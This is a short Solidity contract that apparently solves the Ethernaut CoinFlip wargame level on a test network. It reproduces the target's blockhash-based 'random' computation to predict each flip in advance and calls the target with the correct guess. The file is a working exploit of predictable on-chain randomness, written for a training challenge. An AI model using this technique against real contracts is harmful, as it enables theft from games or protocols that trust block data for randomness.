// SPDX-License-Identifier: MIT
// Deployed contract: https://sepolia.etherscan.io/tx/0xaa17434cfcd2be8b77e3f2fbe380828862ba257d2105b31d062ffa65687170c3
// Ethernaut contract instance: 0x4F2448ff7B2FE7ac251ae855C4f855Be4c458f5A

pragma solidity ^0.8.0;

import "../L003_CoinFlip/CoinFlip.sol";

contract CoinFlipAttack {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public coinflipInstance;

    constructor(CoinFlip _coinFlipInstance) {
        coinflipInstance = CoinFlip(_coinFlipInstance);
    }

    function guess() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 side = blockValue / FACTOR;
        return side == 1 ? true : false;
    }

    function flip() public returns (bool) {
        return coinflipInstance.flip(guess());
    }
}
